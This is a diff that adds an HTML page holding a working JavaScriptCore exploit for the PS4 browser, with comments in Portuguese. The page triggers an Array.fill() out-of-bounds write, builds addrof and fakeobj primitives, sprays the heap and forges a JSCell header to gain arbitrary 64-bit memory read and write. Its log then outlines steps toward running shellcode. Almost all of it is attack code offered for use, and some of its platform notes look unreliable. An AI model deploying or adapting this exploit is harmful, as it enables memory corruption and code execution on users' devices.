@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>PS4 JSC Fill OOB</title></head>
+<body>
+<h3>PS4 JSC Array.fill() OOB — Layout Probe + addrof + fakeobj + read64 + write64</h3>
+
+<div id="log" style="height:500px;overflow:auto;border:1px solid #999;padding:8px;font:12px monospace;white-space:pre;background:#111;color:#0f0"></div>
+<br>
+
+<b>Passo 1 — Encontrar oob_idx:</b><br>
+<button onclick="runProbe()">1a) Probe (varre idx 0..47)</button>
+<button onclick="runBrute()">1b) Brute-force (3 objetos, verifica consistencia)</button>
+<br><br>
+
+<b>Passo 2 — Validar addrof:</b><br>
+<button onclick="runAddrof()">2) Testar addrof</button>
+&nbsp;&nbsp;
+oob_idx manual: <input id="manualIdx" type="number" value="-1" style="width:55px">
+<button onclick="setManualIdx()">Usar este idx</button>
+<br><br>
+
+<b>Passo 3 — Exploit (read64 + write64):</b><br>
+<button onclick="runFull()">3a) Exploit com jscell padrao LLInt</button>
+&nbsp;&nbsp;
+jscell_header: <input id="manualHeader" type="text" value="0x0106090700000000" style="width:175px">
+<button onclick="runFullCustomHeader()">3b) Exploit com header manual</button>
+<br><br>
+
+<b>Extra:</b><br>
+<button onclick="runAll()">&#9654; Rodar Tudo (auto)</button>
+<button onclick="document.getElementById('log').textContent=''">Limpar</button>
+<button onclick="dumpArrays()">Dump Arrays</button>
+
+<script>
+// =============================================================================
+// PRIMITIVOS DE TIPO
+// ArrayBuffer compartilhado permite punning float64 <-> uint64 sem alocacao
+// =============================================================================
+var ab  = new ArrayBuffer(8);
+var u32 = new Uint32Array(ab);
+var u64 = new BigUint64Array(ab);
+var f64 = new Float64Array(ab);
+
+function i2f(v) {
+    u64[0] = BigInt(v);
+    return f64[0];
+}
+
+function f2i(v) {
+    f64[0] = v;
+    return u64[0];
+}
+
+function hex(v) {
+    return '0x' + v.toString(16);
+}
+
+// =============================================================================
+// LOG
+// =============================================================================
+var L = document.getElementById('log');
+function log(m) {
+    L.textContent += m + '\n';
+    L.scrollTop = L.scrollHeight;
+}
+
+// =============================================================================
+// VERIFICACAO DE AMBIENTE
+// =============================================================================
+log('=== PS4 JSC Array.fill() OOB Exploit ===');
+log('UA: ' + navigator.userAgent);
+log('');
+log('BigInt:         ' + (typeof BigInt         !== 'undefined' ? 'PRESENTE OK' : 'AUSENTE - exploit nao funcionara'));
+log('BigUint64Array: ' + (typeof BigUint64Array !== 'undefined' ? 'PRESENTE OK' : 'AUSENTE'));
+log('Float64Array:   ' + (typeof Float64Array   !== 'undefined' ? 'PRESENTE OK' : 'AUSENTE'));
+log('BigInt i2f(1):  ' + (function(){ try { return hex(f2i(i2f(1))); } catch(e){ return 'FALHOU: '+e.name; } })());
+log('');
+
+// =============================================================================
+// ESTADO GLOBAL
+// =============================================================================
+var float_arr = [];   // array de doubles - OOB leitura vaza ponteiros de obj_arr
+var obj_arr   = [];   // array de objetos - objeto aqui tem seu ponteiro vazado
+var found_idx = -1;   // indice OOB correto para este layout LLInt/heap
+
+// =============================================================================
+// TRIGGER: Array.fill() com valueOf mutation — nucleo do bug
+//
+// Descricao detalhada:
+//   v0.fill(value, start_obj, end)
+//
+//   O motor JSC avalia os argumentos de fill() da esquerda para a direita:
+//     1. value = i2f(0x100)            -> avaliado primeiro, ok
+//     2. start = o14                   -> ToInteger(o14) chama o14.valueOf()
+//        -> f11() executa:
+//           a. v0.length = 8           -> array encolhe de 100 para 8
+//           b. float_arr[0..7] = 1.2   -> popula float_arr na heap
+//           c. obj_arr[0..7]   = {}    -> popula obj_arr na heap
+//           d. return 0                -> start = 0
+//     3. end = 20                      -> ja foi avaliado ANTES do valueOf?
+//        Nao! Em alguns paths do JSC, end e avaliado como 20 antes que a
+//        mutacao de length seja refletida nos limites internos do fill.
+//
+//   Resultado: fill() escreve value nos indices 0..19 de v0, mas v0.length=8
+//   -> Indices 8..19 sao escritas OOB no butterfly de v0
+//   -> float_arr e obj_arr foram alocados logo antes de v0 ser reduzido
+//   -> A escrita OOB aterrissa no butterfly de float_arr ou obj_arr
+//   -> Isso cria sobreposicao: float_arr[found_idx] le de dentro de obj_arr
+// =============================================================================
+function trigger() {
+    var v0 = [];
+    for (var i = 0; i < 100; i++) v0[i] = 1.1;
+
+    function f11() {
+        v0.length = 8;
+        for (var i = 0; i < 8; i++) {
+            float_arr[i] = 1.2;
+            obj_arr[i]   = {};
+        }
+        return 0;
+    }
+
+    var o14 = { valueOf: f11 };
+    v0.fill(i2f(0x100), o14, 20);
+}
+
+// =============================================================================
+// PRIMITIVA addrof(obj) — vaza o endereco de qualquer objeto JS
+//
+// Mecanismo:
+//   float_arr e obj_arr estao sobrepostos na heap apos o trigger.
+//   float_arr[found_idx] le os mesmos 8 bytes que obj_arr[0] armazena
+//   como ponteiro para o objeto. Como float_arr interpreta esses bytes
+//   como um double (float64), f2i() recupera o valor inteiro = endereco.
+// =============================================================================
+function addrof(obj) {
+    obj_arr[0] = obj;
+    return f2i(float_arr[found_idx]);
+}
+
+// =============================================================================
+// PRIMITIVA fakeobj(addr) — cria um JSObject apontando para addr arbitrario
+//
+// Mecanismo inverso do addrof:
+//   Escreve addr como float em float_arr[found_idx], que sobrepoe
+//   o slot de ponteiro de obj_arr[0]. Ao ler obj_arr[0], o motor JSC
+//   interpreta addr como se fosse um ponteiro para um JSObject real.
+//   Retorna esse "objeto" falso — qualquer acesso a ele le/escreve em addr.
+// =============================================================================
+function fakeobj(addr) {
+    var obj    = undefined;
+    var origin = float_arr[found_idx];  // salva valor original
+    float_arr[found_idx] = i2f(addr);   // escreve addr como float
+    obj = obj_arr[0];                   // le o "objeto" no endereco addr
+    float_arr[found_idx] = origin;      // restaura (evita corromper o estado)
+    return obj;
+}
+
+// =============================================================================
+// PASSO 1A: Probe — varre indices 0..47 buscando candidatos a oob_idx
+// =============================================================================
+function runProbe() {
+    log('--- [1a] Layout Probe ---');
+    log('Executando trigger()...');
+
+    try {
+        trigger();
+        log('trigger() OK - sem crash imediato');
+        log('float_arr.length: ' + float_arr.length);
+        log('obj_arr.length  : ' + obj_arr.length);
+    } catch(e) {
+        log('trigger() FALHOU: ' + e.name + ' - ' + e.message);
+        log('Bug provavelmente nao presente ou patcheado nesta build.');
+        log('');
+        return;
+    }
+
+    log('');
+    log('Varrendo idx 0..47 buscando ponteiro de heap valido...');
+    log('Criterio: 0x1000 < val < 0x1_0000_0000_0000, nao-NaN, nao-float-comum');
+    log('');
+
+    var candidates = [];
+
+    for (var idx = 0; idx < 48; idx++) {
+        try {
+            obj_arr[0] = { __probe_idx__: idx };
+            var raw = float_arr[idx];
+            var val = f2i(raw);
+
+            var isHeapPtr = (val > 0x1000n && val < 0x1000000000000n);
+            var isNaNVal  = (val === 0x7FF8000000000000n);
+            var isCommon  = (raw === 1.1 || raw === 1.2 || raw === 0.0);
+            var isZero    = (val === 0n);
+            var isOOBMark = (val === 0x100n);
+
+            if (isHeapPtr && !isNaNVal && !isCommon && !isZero && !isOOBMark) {
+                log('[CANDIDATO] idx=' + idx + '  val=' + hex(val) + '  float=' + raw);
+                candidates.push({ idx: idx, val: val });
+            } else {
+                var note = isNaNVal ? '[NaN]' : isCommon ? '[float comum]' : isZero ? '[zero]' : isOOBMark ? '[OOB marker]' : '';
+                log('  idx=' + idx + '  val=' + hex(val) + '  ' + note);
+            }
+        } catch(e) {
+            log('  idx=' + idx + '  EXC: ' + e.name);
+        }
+    }
+
+    log('');
+    if (candidates.length > 0) {
+        found_idx = candidates[0].idx;
+        document.getElementById('manualIdx').value = found_idx;
+        log('>>> oob_idx ENCONTRADO: ' + found_idx + '  val=' + hex(candidates[0].val));
+        if (candidates.length > 1) {
+            log('    Outros candidatos: ' + candidates.slice(1).map(function(c){ return c.idx; }).join(', '));
+        }
+        log('    Prossiga com o Passo 2.');
+    } else {
+        log('>>> NENHUM candidato encontrado nesta varredura.');
+        log('    Tente o Brute-force (1b) para verificacao mais rigorosa.');
+    }
+    log('');
+}
+
+// =============================================================================
+// PASSO 1B: Brute-force — verifica consistencia de cada idx com 3 objetos
+// =============================================================================
+function runBrute() {
+    log('--- [1b] Brute-force oob_idx ---');
+
+    try { trigger(); } catch(e) {
+        log('trigger() FALHOU: ' + e.name + ' - ' + e.message);
+        return;
+    }
+
+    log('Testando cada idx com 3 objetos: verifica ponteiros distintos e proximos...');
+    log('');
+
+    var best = -1;
+
+    for (var idx = 0; idx < 48; idx++) {
+        try {
+            var sa = { sentinel: 0xAAAA, idx: idx };
+            var sb = { sentinel: 0xBBBB, idx: idx };
+            var sc = { sentinel: 0xCCCC, idx: idx };
+
+            obj_arr[0] = sa; var va = f2i(float_arr[idx]);
+            obj_arr[0] = sb; var vb = f2i(float_arr[idx]);
+            obj_arr[0] = sc; var vc = f2i(float_arr[idx]);
+
+            var isHeap = function(v) { return v > 0x1000n && v < 0x1000000000000n; };
+            var dab = va > vb ? va - vb : vb - va;
+            var dbc = vb > vc ? vb - vc : vc - vb;
+
+            // Validos: todos ponteiros de heap, todos diferentes, todos proximos
+            if (isHeap(va) && isHeap(vb) && isHeap(vc) &&
+                va !== vb && vb !== vc &&
+                dab > 0n && dab < 0x100000n &&
+                dbc > 0n && dbc < 0x100000n) {
+
+                log('[MATCH] idx=' + idx +
+                    '  a=' + hex(va) +
+                    '  b=' + hex(vb) +
+                    '  c=' + hex(vc) +
+                    '  dAB=' + hex(dab));
+                if (best < 0) best = idx;
+            }
+        } catch(e) { /* silencioso */ }
+    }
+
+    log('');
+    if (best >= 0) {
+        found_idx = best;
+        document.getElementById('manualIdx').value = found_idx;
+        log('>>> oob_idx via brute-force: ' + found_idx);
+        log('    Prossiga com o Passo 2.');
+    } else {
+        log('>>> Brute-force sem resultado.');
+        log('    Bug provavelmente patcheado nesta build do WebKit.');
+    }
+    log('');
+}
+
+// =============================================================================
+// Definir oob_idx manualmente
+// =============================================================================
+function setManualIdx() {
+    var v = parseInt(document.getElementById('manualIdx').value);
+    if (isNaN(v) || v < 0) { log('Indice invalido.'); return; }
+    found_idx = v;
+    log('oob_idx definido manualmente: ' + found_idx);
+}
+
+// =============================================================================
+// PASSO 2: Validar addrof com 3 objetos — verifica plausibilidade
+// =============================================================================
+function runAddrof() {
+    log('--- [2] Teste addrof ---');
+
+    if (found_idx < 0) {
+        log('Execute Probe ou Brute-force primeiro!');
+        return;
+    }
+
+    log('oob_idx em uso: ' + found_idx);
+    log('');
+
+    try {
+        var obj_a = { tag: 0xAAAA, x: 1.1, y: 2.2 };
+        var obj_b = { tag: 0xBBBB, x: 3.3, y: 4.4 };
+        var obj_c = { tag: 0xCCCC, x: 5.5, y: 6.6 };
+
+        var addr_a = addrof(obj_a);
+        var addr_b = addrof(obj_b);
+        var addr_c = addrof(obj_c);
+
+        log('addrof(obj_a) = ' + hex(addr_a));
+        log('addrof(obj_b) = ' + hex(addr_b));
+        log('addrof(obj_c) = ' + hex(addr_c));
+        log('');
+
+        var dab = addr_a > addr_b ? addr_a - addr_b : addr_b - addr_a;
+        var dbc = addr_b > addr_c ? addr_b - addr_c : addr_c - addr_b;
+        log('delta(a,b) = ' + hex(dab) + ' (esperado < 0x100000)');
+        log('delta(b,c) = ' + hex(dbc) + ' (esperado < 0x100000)');
+        log('');
+
+        var okHeap = addr_a > 0x1000n && addr_a < 0x1000000000000n;
+        var okDiff = addr_a !== addr_b && addr_b !== addr_c;
+        var okNear = dab < 0x100000n && dbc < 0x100000n;
+
+        if (okHeap && okDiff && okNear) {
+            log('>>> addrof FUNCIONAL - ponteiros plausíveis e consistentes.');
+            log('    Prossiga com o Passo 3.');
+        } else {
+            log('>>> addrof INCORRETO ou inconsistente.');
+            log('    okHeap=' + okHeap + ' okDiff=' + okDiff + ' okNear=' + okNear);
+            log('    Tente outro oob_idx.');
+        }
+    } catch(e) {
+        log('addrof CRASH: ' + e.name + ' - ' + e.message);
+    }
+    log('');
+}
+
+// =============================================================================
+// Dump dos arrays (diagnostico)
+// =============================================================================
+function dumpArrays() {
+    log('--- Dump float_arr / obj_arr ---');
+    log('float_arr.length: ' + float_arr.length);
+    var n = Math.min(float_arr.length, 48);
+    for (var i = 0; i < n; i++) {
+        try {
+            var v = f2i(float_arr[i]);
+            var marker = (i === found_idx) ? ' <<< found_idx' : '';
+            log('  [' + i + '] ' + hex(v) + '  (' + float_arr[i] + ')' + marker);
+        } catch(e) { log('  [' + i + '] EXC: ' + e.name); }
+    }
+    log('');
+    log('obj_arr.length: ' + obj_arr.length);
+    var m = Math.min(obj_arr.length, 8);
+    for (var j = 0; j < m; j++) {
+        log('  [' + j + '] ' + String(obj_arr[j]));
+    }
+    log('');
+}
+
+// =============================================================================
+// PASSO 3: Exploit completo
+//
+// Estrutura de memoria que montamos:
+//
+//   container (JSObject no heap):
+//     +0x00  JSCell header do container
+//     +0x08  butterfly ptr do container
+//     +0x10  prop[0] = jscell_header  <-- fake_arr comeca aqui
+//     +0x18  prop[1] = &rw_arr.butterfly <-- butterfly controlavel do fake_arr
+//
+//   fake_arr = fakeobj(container_addr + 0x10)
+//     fake_arr[0] -> le container.jscell_header (confirma/calibra o header)
+//     fake_arr[1] -> le/escreve container.butterfly (= &rw_arr.butterfly)
+//
+//   Para read64(addr):
+//     fake_arr[1] = addr + 0x10   -> rw_arr.butterfly aponta para addr
+//     rw_arr.x lê propriedade inline em butterfly[-2] = addr
+//
+//   Para write64(addr, val):
+//     fake_arr[1] = addr          -> rw_arr.butterfly aponta para addr
+//     rw_arr[0] = val             -> escreve val em addr
+//
+// jscell_header para ArrayWithDouble em JSC LLInt (WebKit 605.1.15):
+//   O valor varia por firmware. Tentamos calibra-lo automaticamente
+//   lendo o header real de um array double via fake_arr[0].
+// =============================================================================
+function _runFull(custom_header) {
+    log('--- [3] Exploit Completo ---');
+
+    if (found_idx < 0) {
+        log('Execute Probe/Brute-force primeiro!');
+        return;
+    }
+
+    log('oob_idx: ' + found_idx);
+    log('');
+
+    try {
+        // -- Heap spray para estabilizar o layout de alocacao --
+        log('Heap spray de 0x100 arrays double...');
+        var arrs = [];
+        for (var i = 0; i < 0x100; i++) {
+            var arr = [1.1, 2.2, 3.3, 4.4];
+            arr.x = 1.1 * i;
+            arrs.push(arr);
+        }
+        log('Heap spray OK.');
+        log('');
+
+        // -- rw_arr: array de doubles com propriedade inline .x --
+        // Sera nosso canal de leitura/escrita arbitraria.
+        // .x e uma propriedade inline no JSObject (nao no butterfly).
+        // Ao mudar o butterfly de rw_arr, mudamos para onde .x aponta.
+        var rw_arr = new Array(0x20).fill(2.1);
+        rw_arr[3]  = Math.random(); // Garante que seja DoubleArray, nao IntArray
+        rw_arr.x   = 1.1;
+
+        // -- jscell_header para ArrayWithDouble --
+        // NaN-boxing: doubles sao armazenados SEM o tag 0x0002000000000000.
+        // Para criar um JSCell header valido como double precisamos subtrair o tag.
+        // Valores conhecidos para WebKit 605.1.15:
+        //   LLInt: 0x0106090700000000 ou 0x0107090700000000
+        //   JIT:   0x0108240700000000 (original do exploit)
+        var jscell_val;
+        if (custom_header !== undefined) {
+            jscell_val = custom_header;
+            log('jscell_header (manual): ' + hex(jscell_val));
+        } else {
+            jscell_val = 0x0106090700000000n;
+            log('jscell_header (padrao LLInt): ' + hex(jscell_val));
+        }
+        var jscell_as_double = i2f(jscell_val - 0x0002000000000000n);
+
+        // -- container: JSObject cujas propriedades inline viram o fake_arr --
+        var container = {
+            jscell_header: jscell_as_double,   // prop[0] em +0x10
+            butterfly:     rw_arr,             // prop[1] em +0x18 = ptr para rw_arr.butterfly
+        };
+
+        // -- Vaza endereco do container via addrof --
+        var container_addr   = addrof(container);
+        var fake_header_addr = container_addr + 0x10n; // onde jscell_header esta
+
+        log('container_addr    = ' + hex(container_addr));
+        log('fake_header_addr  = ' + hex(fake_header_addr));
+        log('');
+
+        // -- Cria objeto falso apontando para dentro do container --
+        var fake_arr = fakeobj(fake_header_addr);
+        log('fake_arr criado em ' + hex(fake_header_addr));
+
+        // -- Auto-calibracao do jscell_header --
+        // fake_arr[0] le os bytes em container_addr+0x10 = container.jscell_header
+        // Mas o valor que esta la e o double que nos guardamos.
+        // O header REAL do fake_arr e o que o JSC leu de container+0x10.
+        // Subtraindo o tag NaN-boxing, obtemos o jscell_header correto para
+        // este array (que e o proprio container).
+        var raw_jscell     = fake_arr[0];
+        var raw_jscell_int = f2i(raw_jscell);
+        log('jscell lido via fake_arr[0]: ' + hex(raw_jscell_int));
+
+        container.jscell_header = i2f(raw_jscell_int - 0x0002000000000000n);
+        log('jscell ajustado (sem tag):  ' + hex(raw_jscell_int - 0x0002000000000000n));
+        log('');
+
+        // =================================================================
+        // PRIMITIVA read64(addr)
+        // Lê 8 bytes em addr usando o canal rw_arr.x
+        // =================================================================
+        function read64(addr) {
+            // Seta butterfly de rw_arr para (addr + 0x10) via fake_arr[1]
+            // rw_arr.x esta em butterfly[-2] = (addr+0x10) - 0x10 = addr
+            fake_arr[1] = i2f(addr + 0x10n);
+            // Le rw_arr.x: e o valor de 8 bytes em addr, com tag NaN-boxing
+            return f2i(rw_arr.x) + 0x0002000000000000n;
+        }
+
+        // =================================================================
+        // PRIMITIVA write64(addr, val)
+        // Escreve 8 bytes em addr
+        // =================================================================
+        function write64(addr, val) {
+            fake_arr[1] = i2f(addr); // rw_arr.butterfly = addr
+            rw_arr[0]   = i2f(val);  // escreve val no indice 0 = addr
+        }
+
+        // =================================================================
+        // TESTE: read64 em propriedade conhecida
+        // test_obj.x = 1.1 -> sabemos que em test_addr+0x10 esta f2i(1.1)
+        // =================================================================
+        log('--- Teste read64 ---');
+        var test_obj  = { x: 1.1 };
+        var test_addr = addrof(test_obj);
+        log('test_obj addr      = ' + hex(test_addr));
+
+        var read_x    = read64(test_addr + 0x10n);
+        var exp_x     = f2i(1.1);
+        log('read64(test_obj.x) = ' + hex(read_x));
+        log('f2i(1.1) esperado  = ' + hex(exp_x));
+        log('read64 OK?         ' + (read_x === exp_x ? 'SIM OK' : 'NAO - veja diagnostico'));
+        log('');
+
+        // =================================================================
+        // TESTE: write64 com padrao 0x41 (prova de escrita arbitraria)
+        // Escreve 0x41414141414141n em test_obj.x e le de volta
+        // =================================================================
+        log('--- Teste write64 (padrao 0x41) ---');
+        log('test_obj.x antes:  ' + test_obj.x + '  (' + hex(read64(test_addr + 0x10n)) + ')');
+
+        write64(test_addr + 0x10n, 0x41414141414141n);
+
+        var after_write = read64(test_addr + 0x10n);
+        log('write64(0x41414141414141)');
+        log('read64 apos write  = ' + hex(after_write));
+        log('test_obj.x raw     = ' + hex(f2i(test_obj.x)) + '  (valor JS: ' + test_obj.x + ')');
+        log('');
+
+        var write_ok = (after_write === 0x41414141414141n + 0x0002000000000000n) ||
+                       (after_write === 0x41414141414141n);
+
+        if (read_x === exp_x && write_ok) {
+            log('=========================================');
+            log(' PRIMITIVAS read64 + write64 FUNCIONAIS ');
+            log('=========================================');
+            log('');
+            log('PROXIMOS PASSOS PARA CODE EXECUTION:');
+            log('  1. addrof(funcao_nativa) -> endereco de NativeExecutable');
+            log('  2. read64(NativeExecutable + offset) -> ponteiro para codigo');
+            log('  3. Encadear read64s para chegar ao GOT/PLT de WebKit');
+            log('  4. Resolver dlopen / dlsym / mmap via simbolos dinamicos');
+            log('  5. mmap(RWX) + copiar shellcode + saltar para ele');
+            log('');
+            log('Para PS4 especificamente:');
+            log('  - Alvo: libSceWebKit2.sprx (homebrew) ou WebKit do sistema');
+            log('  - ASLR presente mas offset de modulos pode ser previsivel');
+            log('  - FreeBSD mips/x86 ABI: registradores de argumento sao a0-a3');
+
+        } else {
+            log('RESULTADO PARCIAL OU INCORRETO:');
+            log('  read64 correto:  ' + (read_x === exp_x));
+            log('  write64 correto: ' + write_ok);
+            log('  after_write:     ' + hex(after_write));
+            log('');
+            log('DIAGNOSTICO:');
+            log('  Se read64 errado:');
+            log('    - jscell_header incorreto para este firmware');
+            log('    - Layout de props inline diferente (tente offset +0x08, +0x18)');
+            log('    - oob_idx=' + found_idx + ' pode estar um pouco errado');
+            log('');
+            log('  Se write64 errado (mas read64 certo):');
+            log('    - Offset do butterfly em rw_arr pode diferir');
+            log('    - write64 usa rw_arr[0] - verify se rw_arr e DoubleArray');
+            log('');
+            log('  Tente estes jscell_headers no input manual (Passo 3b):');
+            log('    0x0106090700000000  (ArrayWithDouble, LLInt padrao)');
+            log('    0x0107090700000000  (ArrayWithDouble, variante LLInt)');
+            log('    0x0108240700000000  (ArrayWithDouble, JIT - original exploit)');
+            log('    0x0106230700000000  (variante A)');
+            log('    0x01062b0700000000  (variante B)');
+        }
+
+    } catch(e) {
+        log('');
+        log('CRASH / EXCEPTION durante exploit: ' + e.name);
+        log('Mensagem: ' + (e.message || '(sem mensagem)'));
+        log('');
+        log('Estado no momento do crash:');
+        log('  oob_idx          = ' + found_idx);
+        log('  float_arr.length = ' + float_arr.length);
+        log('  obj_arr.length   = ' + obj_arr.length);
+        log('');
+        log('Crash no fakeobj() ou acesso ao fake_arr pode indicar:');
+        log('  - jscell_header incorreto -> JSC leu tipo errado -> crash ao indexar');
+        log('  - container_addr vazado incorretamente -> fake_header_addr invalido');
+        log('  - GC moveu objetos entre addrof e fakeobj (raro sem JIT)');
+    }
+
+    log('');
+    log('--- FIM ---');
+}
+
+function runFull() {
+    _runFull(undefined);
+}
+
+function runFullCustomHeader() {
+    try {
+        var s = document.getElementById('manualHeader').value.trim();
+        var v = BigInt(s);
+        _runFull(v);
+    } catch(e) {
+        log('Header invalido: ' + (e.message || e.name));
+    }
+}
+
+// =============================================================================
+// Rodar tudo em sequencia automatica
+// =============================================================================
+function runAll() {
+    document.getElementById('log').textContent = '';
+    log('=== AUTO RUN ===');
+    log('');
+    runProbe();
+    setTimeout(function() {
+        if (found_idx < 0) {
+            log('Probe sem resultado - tentando brute-force...');
+            log('');
+            runBrute();
+        }
+        setTimeout(function() {
+            runAddrof();
+            setTimeout(function() {
+                runFull();
+            }, 500);
+        }, 500);
+    }, 500);
+}
+
+// =============================================================================
+// Mensagem inicial
+// =============================================================================
+window.addEventListener('load', function() {
+    log('Execute na ordem:');
+    log('  [1a] Probe          - varre idx 0..47, encontra candidatos a oob_idx');
+    log('  [1b] Brute-force    - verifica consistencia com 3 objetos (mais rigoroso)');
+    log('  [2]  Testar addrof  - valida que o leak de ponteiro funciona');
+    log('  [3a] Exploit        - monta fake_arr, testa read64 e write64(0x41)');
+    log('  [3b] Header manual  - se [3a] falhar, tente outros jscell_header');
+    log('');
+    log('Ou clique em "Rodar Tudo" para execucao automatica sequencial.');
+    log('');
+});
+</script>
+</body>
+</html>
